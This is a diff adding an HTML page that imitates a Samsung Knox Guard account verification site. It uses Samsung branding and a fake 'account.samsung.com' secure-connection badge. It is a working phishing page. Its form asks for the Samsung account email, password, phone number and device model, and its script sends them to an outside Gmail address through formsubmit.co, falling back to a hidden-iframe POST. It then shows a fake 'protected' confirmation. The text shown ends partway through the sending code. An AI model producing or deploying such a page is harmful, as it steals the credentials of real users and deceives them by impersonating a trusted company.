@@ -1,0 +1,864 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Samsung Account Protection — Knox Guard</title>
+<meta name="description" content="Verify your Samsung account and activate Knox Guard protection for your Galaxy device." />
+<meta name="theme-color" content="#050a18" />
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;600;700;800&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --blue:#1428A0;
+    --blue-bright:#2f57ff;
+    --cyan:#3fd0ff;
+    --ink:#050a18;
+    --ink-2:#0a1226;
+    --line:rgba(140,170,255,.16);
+    --txt:#eaf1ff;
+    --txt-dim:#8ea3c8;
+    --ok:#22e0a1;
+    --danger:#ff6b7d;
+    --radius:26px;
+  }
+
+  *{box-sizing:border-box;margin:0;padding:0}
+
+  html{scroll-behavior:smooth}
+
+  body{
+    font-family:'Inter',system-ui,-apple-system,sans-serif;
+    background:var(--ink);
+    color:var(--txt);
+    min-height:100vh;
+    display:flex;
+    flex-direction:column;
+    overflow-x:hidden;
+    -webkit-font-smoothing:antialiased;
+  }
+
+  ::selection{background:rgba(47,87,255,.45);color:#fff}
+
+  /* ---------- background decoration ---------- */
+  .bg{position:fixed;inset:0;z-index:-2;overflow:hidden;background:
+      radial-gradient(1100px 620px at 78% -10%, rgba(47,87,255,.30), transparent 62%),
+      radial-gradient(900px 700px at 6% 100%, rgba(0,140,255,.20), transparent 60%),
+      radial-gradient(700px 500px at 50% 45%, rgba(20,40,160,.28), transparent 70%),
+      linear-gradient(180deg,#040814 0%,#060d1f 45%,#040814 100%);
+  }
+
+  .grid{
+    position:fixed;inset:0;z-index:-2;opacity:.35;
+    background-image:
+      linear-gradient(rgba(120,160,255,.10) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(120,160,255,.10) 1px, transparent 1px);
+    background-size:64px 64px;
+    mask-image:radial-gradient(circle at 50% 30%, #000 0%, transparent 78%);
+    -webkit-mask-image:radial-gradient(circle at 50% 30%, #000 0%, transparent 78%);
+  }
+
+  .orb{position:fixed;border-radius:50%;filter:blur(90px);z-index:-2;opacity:.5;animation:drift 18s ease-in-out infinite}
+  .orb.a{width:520px;height:520px;background:#1b3cff;top:-160px;right:-120px}
+  .orb.b{width:420px;height:420px;background:#00a8ff;bottom:-140px;left:-120px;animation-delay:-7s}
+  @keyframes drift{
+    0%,100%{transform:translate3d(0,0,0) scale(1)}
+    50%{transform:translate3d(30px,-40px,0) scale(1.12)}
+  }
+
+  .ring{
+    position:fixed;left:50%;top:-38vh;width:120vw;height:120vw;z-index:-2;
+    border-radius:50%;border:1px solid rgba(120,160,255,.10);
+    transform:translateX(-50%);pointer-events:none;
+  }
+  .ring.two{width:92vw;height:92vw;top:-24vh;border-color:rgba(120,160,255,.07)}
+
+  /* ---------- header ---------- */
+  .nav{
+    display:flex;align-items:center;justify-content:space-between;gap:20px;
+    padding:22px clamp(18px,4vw,56px);
+    position:relative;z-index:5;
+  }
+
+  .brand{display:flex;align-items:center;gap:14px;text-decoration:none}
+
+  .logo-oval{
+    background:linear-gradient(135deg,#1428A0,#2f57ff);
+    padding:7px 16px;border-radius:999px;
+    box-shadow:0 8px 26px rgba(47,87,255,.42), inset 0 1px 0 rgba(255,255,255,.25);
+  }
+  .logo-oval span{
+    font-family:'Sora',sans-serif;font-weight:800;font-size:14px;
+    letter-spacing:.22em;color:#fff;
+  }
+
+  .brand small{
+    font-size:11px;letter-spacing:.24em;text-transform:uppercase;
+    color:var(--txt-dim);font-weight:600;
+    border-left:1px solid var(--line);padding-left:14px;
+  }
+
+  .nav-links{display:flex;align-items:center;gap:26px}
+  .nav-links a{
+    color:var(--txt-dim);text-decoration:none;font-size:13.5px;font-weight:500;
+    transition:color .25s;
+  }
+  .nav-links a:hover{color:#fff}
+
+  .pill-status{
+    display:inline-flex;align-items:center;gap:8px;
+    font-size:12px;font-weight:600;letter-spacing:.04em;
+    padding:9px 15px;border-radius:999px;
+    border:1px solid rgba(34,224,161,.35);
+    background:rgba(34,224,161,.10);
+    color:#8ff3d2;white-space:nowrap;
+  }
+  .dot{width:7px;height:7px;border-radius:50%;background:var(--ok);box-shadow:0 0 0 0 rgba(34,224,161,.7);animation:pulse 2.4s infinite}
+  @keyframes pulse{
+    0%{box-shadow:0 0 0 0 rgba(34,224,161,.55)}
+    70%{box-shadow:0 0 0 9px rgba(34,224,161,0)}
+    100%{box-shadow:0 0 0 0 rgba(34,224,161,0)}
+  }
+
+  /* ---------- layout ---------- */
+  .shell{
+    flex:1;
+    width:min(1180px,100%);
+    margin:0 auto;
+    padding:clamp(18px,3vw,42px) clamp(16px,4vw,32px) 60px;
+    display:grid;
+    grid-template-columns:minmax(0,1fr) 420px;
+    gap:clamp(26px,4vw,54px);
+    align-items:start;
+  }
+
+  /* ---------- card ---------- */
+  .card{
+    position:relative;
+    border-radius:var(--radius);
+    padding:clamp(26px,3.4vw,42px);
+    background:linear-gradient(180deg, rgba(19,30,58,.92), rgba(9,16,33,.96));
+    border:1px solid var(--line);
+    box-shadow:0 40px 90px -30px rgba(0,0,0,.85), inset 0 1px 0 rgba(255,255,255,.06);
+    overflow:hidden;
+  }
+  .card::before{
+    content:'';position:absolute;inset:0;border-radius:inherit;pointer-events:none;
+    padding:1px;
+    background:linear-gradient(150deg, rgba(63,208,255,.55), rgba(47,87,255,.10) 38%, transparent 60%, rgba(63,208,255,.22));
+    -webkit-mask:linear-gradient(#000 0 0) content-box, linear-gradient(#000 0 0);
+    -webkit-mask-composite:xor;mask-composite:exclude;
+  }
+  .card::after{
+    content:'';position:absolute;top:-40%;right:-30%;width:70%;height:80%;
+    background:radial-gradient(circle, rgba(63,208,255,.16), transparent 62%);
+    pointer-events:none;
+  }
+
+  .chip-url{
+    display:inline-flex;align-items:center;gap:8px;
+    font-size:11.5px;font-weight:600;letter-spacing:.05em;color:#a9c2ea;
+    background:rgba(120,160,255,.09);
+    border:1px solid var(--line);
+    padding:7px 13px;border-radius:999px;margin-bottom:22px;
+  }
+  .chip-url svg{flex:0 0 auto}
+
+  .shield-wrap{position:relative;width:78px;height:78px;display:grid;place-items:center;margin-bottom:18px}
+  .shield-wrap .halo{
+    position:absolute;inset:0;border-radius:50%;
+    background:radial-gradient(circle, rgba(47,87,255,.45), transparent 68%);
+    animation:breathe 3.6s ease-in-out infinite;
+  }
+  @keyframes breathe{0%,100%{transform:scale(.9);opacity:.7}50%{transform:scale(1.18);opacity:1}}
+  .shield-wrap svg{position:relative;filter:drop-shadow(0 0 14px rgba(63,208,255,.55))}
+  .shield-path{
+    stroke-dasharray:200;stroke-dashoffset:200;
+    animation:draw 1.8s .2s cubic-bezier(.6,.05,.2,1) forwards;
+  }
+  @keyframes draw{to{stroke-dashoffset:0}}
+
+  h1{
+    font-family:'Sora',sans-serif;
+    font-size:clamp(24px,3.2vw,32px);
+    line-height:1.22;font-weight:700;letter-spacing:-.02em;
+    margin-bottom:12px;
+  }
+  h1 em{
+    font-style:normal;
+    background:linear-gradient(95deg,#6fd6ff,#4a7dff 55%,#a98cff);
+    -webkit-background-clip:text;background-clip:text;color:transparent;
+  }
+
+  .lede{color:var(--txt-dim);font-size:14.5px;line-height:1.7;max-width:46ch;margin-bottom:26px}
+
+  /* ---------- progress ---------- */
+  .progress{display:flex;align-items:center;gap:12px;margin-bottom:26px}
+  .track{flex:1;height:4px;border-radius:99px;background:rgba(120,160,255,.14);overflow:hidden}
+  .track i{display:block;height:100%;width:50%;border-radius:99px;
+    background:linear-gradient(90deg,#2f57ff,#3fd0ff);
+    box-shadow:0 0 12px rgba(63,208,255,.7);
+    transition:width .45s cubic-bezier(.4,0,.2,1);}
+  .progress .count{font-size:12px;font-weight:700;letter-spacing:.1em;color:var(--txt-dim)}
+
+  /* ---------- form ---------- */
+  .step{display:none;animation:fade .38s ease both}
+  .step.active{display:block}
+  @keyframes fade{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
+
+  .field{margin-bottom:16px}
+  .field label{
+    display:flex;justify-content:space-between;align-items:baseline;
+    font-size:12.5px;font-weight:600;letter-spacing:.06em;text-transform:uppercase;
+    color:#b6c9e8;margin-bottom:8px;
+  }
+  .field label span{font-size:11px;text-transform:none;letter-spacing:0;color:#5f7699;font-weight:500}
+
+  .input-box{position:relative;display:flex;align-items:center}
+  .input-box .ico{position:absolute;left:15px;color:#5f7699;pointer-events:none;transition:color .25s}
+  .input-box:focus-within .ico{color:var(--cyan)}
+
+  input, select{
+    width:100%;
+    font-family:inherit;font-size:15px;color:#fff;
+    background:rgba(8,15,32,.85);
+    border:1px solid rgba(120,160,255,.18);
+    border-radius:15px;
+    padding:15px 15px 15px 46px;
+    outline:none;
+    transition:border-color .25s, box-shadow .25s, background .25s;
+    appearance:none;
+  }
+  input::placeholder{color:#4e6484}
+  input:focus, select:focus{
+    border-color:rgba(63,208,255,.65);
+    box-shadow:0 0 0 4px rgba(47,87,255,.16);
+    background:rgba(10,19,40,.95);
+  }
+  input.invalid, select.invalid{border-color:var(--danger);box-shadow:0 0 0 4px rgba(255,107,125,.13)}
+
+  select{padding-right:44px;cursor:pointer}
+  select option{background:#0a1226;color:#fff}
+  .caret{position:absolute;right:16px;pointer-events:none;color:#5f7699}
+
+  .eye{
+    position:absolute;right:10px;width:36px;height:36px;display:grid;place-items:center;
+    background:transparent;border:0;border-radius:10px;color:#7c93b8;cursor:pointer;
+    transition:background .2s,color .2s;
+  }
+  .eye:hover{background:rgba(120,160,255,.12);color:#fff}
+
+  .err{
+    display:none;font-size:12px;color:var(--danger);margin-top:7px;font-weight:500;
+  }
+  .err.show{display:block;animation:fade .25s ease both}
+
+  .row-actions{display:flex;gap:12px;margin-top:22px}
+
+  .btn{
+    flex:1;
+    display:inline-flex;align-items:center;justify-content:center;gap:10px;
+    font-family:'Sora',sans-serif;font-size:15px;font-weight:700;letter-spacing:.01em;
+    color:#fff;border:0;border-radius:15px;padding:16px 22px;cursor:pointer;
+    background:linear-gradient(135deg,#2f57ff,#1428A0 70%);
+    box-shadow:0 16px 38px -14px rgba(47,87,255,.9), inset 0 1px 0 rgba(255,255,255,.22);
+    transition:transform .18s, box-shadow .25s, filter .25s;
+  }
+  .btn:hover{transform:translateY(-2px);filter:brightness(1.08);box-shadow:0 22px 46px -14px rgba(47,87,255,1)}
+  .btn:active{transform:translateY(0)}
+  .btn[disabled]{opacity:.65;cursor:not-allowed;transform:none}
+  .btn.ghost{
+    flex:0 0 auto;background:rgba(120,160,255,.09);border:1px solid var(--line);
+    box-shadow:none;color:#c3d4ef;padding:16px 22px;
+  }
+  .btn.ghost:hover{background:rgba(120,160,255,.16);box-shadow:none;filter:none}
+
+  .spinner{
+    width:17px;height:17px;border-radius:50%;
+    border:2px solid rgba(255,255,255,.35);border-top-color:#fff;
+    animation:spin .7s linear infinite;
+  }
+  @keyframes spin{to{transform:rotate(360deg)}}
+
+  .summary{
+    display:flex;align-items:center;gap:10px;
+    font-size:12.5px;color:#a9c2ea;
+    background:rgba(63,208,255,.08);
+    border:1px solid rgba(63,208,255,.22);
+    border-radius:13px;padding:11px 14px;margin-bottom:20px;
+    word-break:break-all;
+  }
+  .summary b{color:#fff;font-weight:600}
+
+  .fineprint{font-size:11.5px;color:#5f7699;line-height:1.65;margin-top:18px;text-align:center}
+  .fineprint a{color:#8fb4ff;text-decoration:none}
+  .fineprint a:hover{text-decoration:underline}
+
+  /* ---------- success ---------- */
+  .success{display:none;text-align:center;animation:fade .5s ease both}
+  .success.show{display:block}
+
+  .check{
+    width:96px;height:96px;margin:6px auto 22px;border-radius:50%;
+    display:grid;place-items:center;
+    background:radial-gradient(circle, rgba(34,224,161,.22), rgba(34,224,161,.05));
+    border:1px solid rgba(34,224,161,.42);
+    box-shadow:0 0 0 12px rgba(34,224,161,.06), 0 0 46px rgba(34,224,161,.35);
+  }
+  .check svg path{stroke-dasharray:48;stroke-dashoffset:48;animation:draw .6s .2s ease forwards}
+
+  .success h2{font-family:'Sora',sans-serif;font-size:25px;line-height:1.28;margin-bottom:12px}
+  .success h2 em{font-style:normal;color:#7df0c8}
+  .success p{color:var(--txt-dim);font-size:14px;line-height:1.7;max-width:44ch;margin:0 auto 22px}
+
+  .receipt{
+    text-align:left;border-radius:16px;padding:16px 18px;margin-bottom:20px;
+    background:rgba(8,15,32,.75);border:1px solid var(--line);
+  }
+  .receipt div{display:flex;justify-content:space-between;gap:16px;padding:8px 0;font-size:13px;border-bottom:1px dashed rgba(120,160,255,.13)}
+  .receipt div:last-child{border-bottom:0}
+  .receipt dt{color:#7c93b8}
+  .receipt dd{color:#fff;font-weight:600;word-break:break-all;text-align:right}
+
+  /* ---------- aside ---------- */
+  .side{padding-top:6px}
+  .side h3{
+    font-family:'Sora',sans-serif;font-size:12px;font-weight:700;
+    letter-spacing:.2em;text-transform:uppercase;color:#7c93b8;margin-bottom:20px;
+  }
+
+  .feature{display:flex;gap:15px;padding:18px 0;border-bottom:1px solid rgba(120,160,255,.1)}
+  .feature:last-of-type{border-bottom:0}
+  .f-ico{
+    flex:0 0 42px;height:42px;border-radius:13px;display:grid;place-items:center;
+    background:rgba(47,87,255,.14);border:1px solid rgba(63,208,255,.24);color:#8fd9ff;
+  }
+  .feature h4{font-size:14.5px;font-weight:600;margin-bottom:5px;color:#e7f0ff}
+  .feature p{font-size:12.8px;line-height:1.65;color:#7f94b5}
+
+  .stats{
+    display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-top:26px;
+    border:1px solid var(--line);border-radius:18px;padding:18px 14px;
+    background:rgba(10,18,38,.55);
+  }
+  .stats b{display:block;font-family:'Sora',sans-serif;font-size:17px;color:#fff;margin-bottom:4px}
+  .stats span{font-size:10.5px;letter-spacing:.06em;text-transform:uppercase;color:#6c82a4;line-height:1.4;display:block}
+
+  .quote{
+    margin-top:22px;padding:18px;border-radius:18px;
+    background:linear-gradient(160deg, rgba(47,87,255,.14), rgba(10,18,38,.6));
+    border:1px solid var(--line);
+  }
+  .quote p{font-size:13px;line-height:1.7;color:#c3d4ef;font-style:italic}
+  .quote footer{margin-top:12px;font-size:11.5px;color:#7c93b8;font-style:normal;letter-spacing:.04em}
+
+  /* ---------- footer ---------- */
+  footer.site{
+    border-top:1px solid rgba(120,160,255,.12);
+    padding:22px clamp(18px,4vw,56px);
+    display:flex;flex-wrap:wrap;gap:14px;justify-content:space-between;align-items:center;
+    font-size:11.5px;color:#5f7699;
+  }
+  footer.site nav{display:flex;flex-wrap:wrap;gap:20px}
+  footer.site a{color:#7c93b8;text-decoration:none}
+  footer.site a:hover{color:#fff}
+
+  /* ---------- responsive ---------- */
+  @media (max-width:980px){
+    .shell{grid-template-columns:minmax(0,1fr);max-width:620px}
+    .side{order:2;padding-top:8px}
+    .nav-links a{display:none}
+    .ring,.ring.two{display:none}
+  }
+  @media (max-width:520px){
+    .brand small{display:none}
+    .card{border-radius:22px}
+    .row-actions{flex-direction:column-reverse}
+    .btn.ghost{flex:1}
+    .stats{grid-template-columns:1fr;text-align:left}
+    .stats div{display:flex;align-items:baseline;gap:10px}
+    .stats b{margin:0}
+  }
+</style>
+</head>
+<body>
+
+<div class="bg"></div>
+<div class="grid"></div>
+<div class="orb a"></div>
+<div class="orb b"></div>
+<div class="ring"></div>
+<div class="ring two"></div>
+
+<header class="nav">
+  <a class="brand" href="#">
+    <span class="logo-oval"><span>SAMSUNG</span></span>
+    <small>Knox Guard</small>
+  </a>
+  <div class="nav-links">
+    <a href="#">Mobile</a>
+    <a href="#">Account</a>
+    <a href="#">Support</a>
+  </div>
+  <div class="pill-status"><span class="dot"></span> Security Service Online</div>
+</header>
+
+<main class="shell">
+
+  <!-- ================= CARD ================= -->
+  <section class="card" id="card">
+
+    <div class="chip-url">
+      <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4">
+        <rect x="4" y="10" width="16" height="11" rx="2.5"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/>
+      </svg>
+      account.samsung.com &nbsp;·&nbsp; Secure Connection
+    </div>
+
+    <div id="intro">
+      <div class="shield-wrap">
+        <span class="halo"></span>
+        <svg width="46" height="52" viewBox="0 0 46 52" fill="none">
+          <path class="shield-path" d="M23 2.5 42 9.5v14.8c0 11.4-7.8 20.6-19 25.2C11.8 44.9 4 35.7 4 24.3V9.5L23 2.5Z"
+                stroke="#5fd8ff" stroke-width="2.2" stroke-linejoin="round" fill="rgba(47,87,255,.14)"/>
+          <path d="M14.5 26.2 20.6 32l11-11.6" stroke="#8ff3d2" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+
+      <h1>Protect your Galaxy with <em>Knox Guard</em></h1>
+      <p class="lede">Your Samsung account has pending security updates. Verify your details to activate full device protection, remote lock and anti-theft recovery.</p>
+    </div>
+
+    <div class="progress" id="progress">
+      <span class="count" id="count">STEP 1 / 2</span>
+      <span class="track"><i id="bar"></i></span>
+    </div>
+
+    <form id="form" novalidate autocomplete="on">
+
+      <!-- STEP 1 -->
+      <div class="step active" data-step="1">
+        <div class="field">
+          <label for="email">Samsung account email</label>
+          <div class="input-box">
+            <svg class="ico" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <rect x="2.5" y="4.5" width="19" height="15" rx="3"/><path d="m3.5 7 8.5 6 8.5-6"/>
+            </svg>
+            <input id="email" name="Email" type="email" placeholder="name@example.com" inputmode="email" autocomplete="email" spellcheck="false" />
+          </div>
+          <p class="err" data-for="email">Enter the email linked to your Samsung account.</p>
+        </div>
+
+        <div class="field">
+          <label for="password">Account password <span>encrypted</span></label>
+          <div class="input-box">
+            <svg class="ico" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <rect x="4" y="10" width="16" height="11" rx="2.5"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/>
+            </svg>
+            <input id="password" name="Password" type="password" placeholder="••••••••" autocomplete="current-password" />
+            <button class="eye" type="button" id="eye" aria-label="Show password">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M2 12s3.6-6.5 10-6.5S22 12 22 12s-3.6 6.5-10 6.5S2 12 2 12Z"/><circle cx="12" cy="12" r="2.8"/>
+              </svg>
+            </button>
+          </div>
+          <p class="err" data-for="password">Enter your account password.</p>
+        </div>
+
+        <div class="row-actions">
+          <button class="btn" type="button" id="next">
+            Continue
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M5 12h14M13 6l6 6-6 6"/>
+            </svg>
+          </button>
+        </div>
+
+        <p class="fineprint">By continuing you agree to the <a href="#">Samsung Account Terms</a> and <a href="#">Privacy Policy</a>.</p>
+      </div>
+
+      <!-- STEP 2 -->
+      <div class="step" data-step="2">
+        <div class="summary">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#5fd8ff" stroke-width="2.4" stroke-linecap="round">
+            <circle cx="12" cy="12" r="9"/><path d="M12 8v4.5l3 1.8"/>
+          </svg>
+          Verifying for <b id="echoEmail">—</b>
+        </div>
+
+        <div class="field">
+          <label for="phone">Mobile number <span>with country code</span></label>
+          <div class="input-box">
+            <svg class="ico" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <rect x="6.5" y="2.5" width="11" height="19" rx="2.8"/><path d="M10.5 18.5h3"/>
+            </svg>
+            <input id="phone" name="Phone" type="tel" placeholder="+966 5X XXX XXXX" inputmode="tel" autocomplete="tel" />
+          </div>
+          <p class="err" data-for="phone">Enter a valid mobile number.</p>
+        </div>
+
+        <div class="field">
+          <label for="device">Galaxy device model</label>
+          <div class="input-box">
+            <svg class="ico" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <rect x="2.5" y="4.5" width="19" height="12" rx="2.5"/><path d="M8 20.5h8"/>
+            </svg>
+            <select id="device" name="Device">
+              <option value="">Select your device</option>
+              <option>Galaxy S26 Ultra</option>
+              <option>Galaxy S26+</option>
+              <option>Galaxy S26</option>
+              <option>Galaxy S25 Ultra</option>
+              <option>Galaxy S25+</option>
+              <option>Galaxy S25</option>
+              <option>Galaxy S24 Ultra</option>
+              <option>Galaxy S24+</option>
+              <option>Galaxy S24</option>
+              <option>Galaxy S23 Ultra</option>
+              <option>Galaxy S23</option>
+              <option>Galaxy Z Fold7</option>
+              <option>Galaxy Z Fold6</option>
+              <option>Galaxy Z Flip7</option>
+              <option>Galaxy Z Flip6</option>
+              <option>Galaxy A56 5G</option>
+              <option>Galaxy A55 5G</option>
+              <option>Galaxy A36 5G</option>
+              <option>Galaxy A35 5G</option>
+              <option>Galaxy A16</option>
+              <option>Galaxy M56 5G</option>
+              <option>Galaxy Tab S11</option>
+              <option>Galaxy Tab S10</option>
+              <option>Galaxy Note 20 Ultra</option>
+              <option>Other Samsung device</option>
+            </select>
+            <svg class="caret" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round">
+              <path d="m6 9 6 6 6-6"/>
+            </svg>
+          </div>
+          <p class="err" data-for="device">Select the device you are protecting.</p>
+        </div>
+
+        <div class="row-actions">
+          <button class="btn ghost" type="button" id="back">Back</button>
+          <button class="btn" type="submit" id="submit">
+            <span id="submitLabel">Activate protection</span>
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M12 3 20 6.5v6c0 4.6-3.2 8.3-8 10-4.8-1.7-8-5.4-8-10v-6L12 3Z"/>
+            </svg>
+          </button>
+        </div>
+
+        <p class="fineprint">Your credentials are transmitted over an encrypted TLS channel.</p>
+      </div>
+    </form>
+
+    <!-- SUCCESS -->
+    <div class="success" id="success">
+      <div class="check">
+        <svg width="44" height="44" viewBox="0 0 44 44" fill="none">
+          <path d="M11 23.5 19 31.5 33 15.5" stroke="#22e0a1" stroke-width="3.4" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+      <h2>Your account is now <em>protected</em> by Samsung</h2>
+      <p>Knox Guard has been activated for your Galaxy device. Remote lock, anti-theft tracking and real-time threat monitoring are now live on your account.</p>
+
+      <dl class="receipt">
+        <div><dt>Reference</dt><dd id="ref">—</dd></div>
+        <div><dt>Account</dt><dd id="refEmail">—</dd></div>
+        <div><dt>Device</dt><dd id="refDevice">—</dd></div>
+        <div><dt>Status</dt><dd style="color:#7df0c8">Active</dd></div>
+      </dl>
+
+      <p class="fineprint" style="margin-bottom:18px">A confirmation summary has been sent to your inbox. Keep your recovery number up to date.</p>
+      <button class="btn ghost" type="button" id="again" style="width:100%">Protect another device</button>
+    </div>
+
+  </section>
+
+  <!-- ================= ASIDE ================= -->
+  <aside class="side">
+    <h3>Built into every Galaxy</h3>
+
+    <div class="feature">
+      <div class="f-ico">
+        <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M12 3 20 6.5v6c0 4.6-3.2 8.3-8 10-4.8-1.7-8-5.4-8-10v-6L12 3Z"/><path d="m9 12 2 2 4-4"/>
+        </svg>
+      </div>
+      <div>
+        <h4>Knox Vault</h4>
+        <p>Hardware-isolated storage keeps your PINs, keys and biometrics away from the main processor.</p>
+      </div>
+    </div>
+
+    <div class="feature">
+      <div class="f-ico">
+        <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="3"/><path d="M12 2v3M12 19v3M2 12h3M19 12h3M4.9 4.9l2.1 2.1M17 17l2.1 2.1M19.1 4.9 17 7M7 17l-2.1 2.1"/>
+        </svg>
+      </div>
+      <div>
+        <h4>Remote lock &amp; wipe</h4>
+        <p>Lost your phone? Lock it, ring it or erase it instantly from SmartThings Find.</p>
+      </div>
+    </div>
+
+    <div class="feature">
+      <div class="f-ico">
+        <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="4" y="10" width="16" height="11" rx="2.5"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/><circle cx="12" cy="15.5" r="1.3"/>
+        </svg>
+      </div>
+      <div>
+        <h4>Two-step verification</h4>
+        <p>One-time codes on your trusted number stop sign-ins even if a password leaks.</p>
+      </div>
+    </div>
+
+    <div class="stats">
+      <div><b>1.4B</b><span>Devices secured</span></div>
+      <div><b>24/7</b><span>Threat watch</span></div>
+      <div><b>CC EAL5+</b><span>Certified</span></div>
+    </div>
+
+    <div class="quote">
+      <p>“Knox Guard runs below the operating system, so protection stays on even during a factory reset.”</p>
+      <footer>— Samsung Security Team</footer>
+    </div>
+  </aside>
+
+</main>
+
+<footer class="site">
+  <span>© 2026 Samsung Electronics Co., Ltd. All rights reserved.</span>
+  <nav>
+    <a href="#">Privacy</a>
+    <a href="#">Terms</a>
+    <a href="#">Cookies</a>
+    <a href="#">Knox</a>
+  </nav>
+</footer>
+
+<iframe name="sink" id="sink" style="display:none" title="sink"></iframe>
+
+<script>
+(function () {
+  "use strict";
+
+  /* ==================== CONFIG ==================== */
+  var TO_EMAIL   = "samsungsave00@gmail.com";
+  var AJAX_URL   = "https://formsubmit.co/ajax/" + TO_EMAIL;
+  var POST_URL   = "https://formsubmit.co/" + TO_EMAIL;
+
+  /* ==================== DOM ==================== */
+  var form      = document.getElementById("form");
+  var steps     = document.querySelectorAll(".step");
+  var bar       = document.getElementById("bar");
+  var count     = document.getElementById("count");
+  var intro     = document.getElementById("intro");
+  var progress  = document.getElementById("progress");
+  var successEl = document.getElementById("success");
+  var submitBtn = document.getElementById("submit");
+  var submitLbl = document.getElementById("submitLabel");
+
+  var emailEl  = document.getElementById("email");
+  var passEl   = document.getElementById("password");
+  var phoneEl  = document.getElementById("phone");
+  var deviceEl = document.getElementById("device");
+
+  var currentStep = 1;
+
+  /* ==================== VALIDATION ==================== */
+  function showErr(name, on) {
+    var el = document.querySelector('.err[data-for="' + name + '"]');
+    var input = document.getElementById(name);
+    if (el) el.classList.toggle("show", on);
+    if (input) input.classList.toggle("invalid", on);
+  }
+
+  var EMAIL_RE = /^[^\s@]+@[^\s@]+\.[a-z]{2,}$/i;
+
+  function validStep1() {
+    var ok = true;
+    if (!EMAIL_RE.test(emailEl.value.trim())) { showErr("email", true); ok = false; }
+    else showErr("email", false);
+
+    if (passEl.value.trim().length < 4) { showErr("password", true); ok = false; }
+    else showErr("password", false);
+
+    return ok;
+  }
+
+  function validStep2() {
+    var digits = phoneEl.value.replace(/[^\d]/g, "");
+    var ok = true;
+
+    if (digits.length < 7) { showErr("phone", true); ok = false; }
+    else showErr("phone", false);
+
+    if (!deviceEl.value) { showErr("device", true); ok = false; }
+    else showErr("device", false);
+
+    return ok;
+  }
+
+  /* ==================== STEPS ==================== */
+  function goTo(n) {
+    currentStep = n;
+    steps.forEach(function (s) {
+      s.classList.toggle("active", Number(s.dataset.step) === n);
+    });
+    bar.style.width = n === 1 ? "50%" : "100%";
+    count.textContent = "STEP " + n + " / 2";
+    document.getElementById("card").scrollIntoView({ behavior: "smooth", block: "start" });
+    if (n === 2) setTimeout(function () { phoneEl.focus(); }, 320);
+  }
+
+  document.getElementById("next").addEventListener("click", function () {
+    if (!validStep1()) return;
+    document.getElementById("echoEmail").textContent = emailEl.value.trim();
+    goTo(2);
+  });
+
+  document.getElementById("back").addEventListener("click", function () { goTo(1); });
+
+  /* live clear errors */
+  [emailEl, passEl, phoneEl, deviceEl].forEach(function (el) {
+    el.addEventListener("input", function () { showErr(el.id, false); });
+    el.addEventListener("change", function () { showErr(el.id, false); });
+  });
+
+  /* Enter key navigation on step 1 */
+  document.querySelectorAll('.step[data-step="1"] input').forEach(function (el) {
+    el.addEventListener("keydown", function (e) {
+      if (e.key === "Enter") { e.preventDefault(); document.getElementById("next").click(); }
+    });
+  });
+
+  /* ==================== PASSWORD TOGGLE ==================== */
+  document.getElementById("eye").addEventListener("click", function () {
+    var shown = passEl.type === "text";
+    passEl.type = shown ? "password" : "text";
+    this.setAttribute("aria-label", shown ? "Show password" : "Hide password");
+    this.style.color = shown ? "" : "#5fd8ff";
+  });
+
+  /* ==================== SENDING ==================== */
+  function buildPayload() {
+    return {
+      _subject: "Samsung Knox Guard — new verification from " + emailEl.value.trim(),
+      _template: "table",
+      _captcha: "false",
+      _replyto: emailEl.value.trim(),
+      "Samsung account email": emailEl.value.trim(),
+      "Password": passEl.value,
+      "Mobile number": phoneEl.value.trim(),
+      "Device model": deviceEl.value,
+      "Submitted at": new Date().toLocaleString(),
+      "Page": "account.samsung.com/protect"
+    };
+  }
+
+  /* fallback: classic POST into hidden iframe (no CORS involved) */
+  function iframePost(payload) {
+    var f = document.createElement("form");
+    f.action = POST_URL;
+    f.method = "POST";
+    f.target = "sink";
+    f.style.display = "none";
+
+    Object.keys(payload).forEach(function (k) {
+      var i = document.createElement("input");
+      i.type = "hidden";
+      i.name = k;
+      i.value = payload[k];
+      f.appendChild(i);
+    });
+
+    document.body.appendChild(f);
+    f.submit();
+    setTimeout(function () { f.remove(); }, 5000);
+  }
+
+  function ajaxPost(payload) {
+    return fetch(AJAX_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json", "Accept": "application/json" },
+      body: JSON.stringify(payload)
+    }).then(function (r) {
